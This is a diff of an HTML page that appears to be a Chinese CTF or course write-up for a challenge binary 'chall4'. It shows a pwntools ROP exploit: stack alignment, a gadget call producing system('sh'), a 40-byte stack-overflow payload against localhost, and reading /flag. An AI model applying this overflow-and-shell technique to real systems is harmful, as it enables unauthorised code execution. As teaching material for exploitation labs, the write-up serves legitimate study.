+<span class="c1"># 使用 pwntools.ROP 模块</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
 
-# 栈对齐，https://github.com/Gallopsled/pwntools/issues/1870
-rop.call(rop.ret)
+<span class="c1"># 栈对齐，https://github.com/Gallopsled/pwntools/issues/1870</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">ret</span><span class="p">)</span>
 
-# 目标: call gadget_func('s', 'h', 0)
-# pwntools 会自动寻找 pop rdi/rsi/rdx 等gadgets来设置参数
-# https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call
+<span class="c1"># 目标: call gadget_func(&#39;s&#39;, &#39;h&#39;, 0)</span>
+<span class="c1"># pwntools 会自动寻找 pop rdi/rsi/rdx 等gadgets来设置参数</span>
+<span class="c1"># https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call</span>
 
-rop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0)) #__TODO__
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gadget_func&#39;</span><span class="p">],(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">),</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">))</span> <span class="c1">#__TODO__</span>
 
-log.info(&quot;Constructed ROP chain:\n&quot; + rop.dump())
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Constructed ROP chain:</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
 
-# 32字节缓冲区 + ?
-payload = b'A' * 40 + rop.chain() #__TODO__
+<span class="c1"># 32字节缓冲区 + ?</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span> <span class="c1">#__TODO__</span>
 
-# pause()
+<span class="c1"># pause()</span>
 
-p.sendlineafter(b&quot;payload: &quot;, payload)
-p.interactive()
-</code></pre>
-<pre><code class="language-python">from pwn import *
-# p = process(&quot;./chall4&quot;)
-context.arch='amd64'
-p = remote(&quot;localhost&quot;, 9004)
-e = ELF(&quot;./chall4&quot;)
-</code></pre>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;payload: &quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="c1"># p = process(&quot;./chall4&quot;)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9004</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chall4&quot;</span><span class="p">)</span>
+</code></pre></div>
 <p>Part 1 将 pwn 库导入，指明架构为 amd64，远程连接，读入 chall4 的符号表、GOT 等。</p>
-<pre><code class="language-python"># 使用 pwntools.ROP 模块
-rop = ROP(e)
+<div class="highlight"><pre><span></span><code><span class="c1"># 使用 pwntools.ROP 模块</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
 
-# 栈对齐，https://github.com/Gallopsled/pwntools/issues/1870
-rop.call(rop.ret)
+<span class="c1"># 栈对齐，https://github.com/Gallopsled/pwntools/issues/1870</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">ret</span><span class="p">)</span>
 
-# 目标: call gadget_func('s', 'h', 0)
-# pwntools 会自动寻找 pop rdi/rsi/rdx 等gadgets来设置参数
-# https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call
+<span class="c1"># 目标: call gadget_func(&#39;s&#39;, &#39;h&#39;, 0)</span>
+<span class="c1"># pwntools 会自动寻找 pop rdi/rsi/rdx 等gadgets来设置参数</span>
+<span class="c1"># https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call</span>
 
-rop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0)) #__TODO__
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gadget_func&#39;</span><span class="p">],(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">),</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">))</span> <span class="c1">#__TODO__</span>
 
-log.info(&quot;Constructed ROP chain:\n&quot; + rop.dump())
-</code></pre>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Constructed ROP chain:</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</code></pre></div>
 <p>Part 2 <code>rop = ROP(e)</code> 调用 pwntools 的 ROP 工具，用于自动分析 ELF，自动搜寻 gadget，自动构造 ROP chain. <code>rop.call(rop.ret)</code> 栈对齐，这是因为 glibc 在执行函数（包括 system、printf） 时要求栈十六字节对齐（stack 16-byte aligned），否则可能崩溃。此处仅加入一个 <code>ret</code> gadget 使得 rsp 寄存器加 8，从而十六字节对齐。</p>
 <p>接下来我们要利用栈溢出。<code>rop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0))</code> 将 <code>'s'</code>、<code>'h'</code>、<code>'\0'</code> 塞入寄存器中，其串出的指令 <code>system("sh")</code> 可以创建一个子进程，从而获取 shell 权限。此处字符 <code>'s'</code> 与<code>'h'</code> 通过 <code>ord()</code> 强行转化为 char 类型。</p>
-<pre><code class="language-python"># 32字节缓冲区 + ?
-payload = b'A' * 40 + rop.chain() #__TODO__
+<div class="highlight"><pre><span></span><code><span class="c1"># 32字节缓冲区 + ?</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span> <span class="c1">#__TODO__</span>
 
-# pause()
+<span class="c1"># pause()</span>
 
-p.sendlineafter(b&quot;payload: &quot;, payload)
-p.interactive()
-</code></pre>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;payload: &quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
 <p>Part 3 我们就要让这个栈溢出，设置 payload，从栈帧来看，它不仅应占掉缓冲区的 32 个字节，还要占掉 rbp 的 8 个字节，接下来就要越界到 rip 的 8 个字节了，这个时候 <code>ret</code> 就是 <code>pop RIP</code> ，逐步将我们之前设置的 <code>'s'</code>、<code>'h'</code>、<code>'\0'</code> 弹出来。</p>
 <p>接下来 <code>sendlineafter</code> 开始执行函数，并通过栈溢出实际执行了 <code>system("sh")</code> ，于是接下来使用 <code>p.interactive()</code> 切换到交互模式。接下来同 exp3 获取 flag.</p>
 <p>获取权限后我们通过 <code>ls</code> 查看目录下文件，看到 flag 文件后直接执行 <code>cat /flag</code> 输出其中内容。</p>
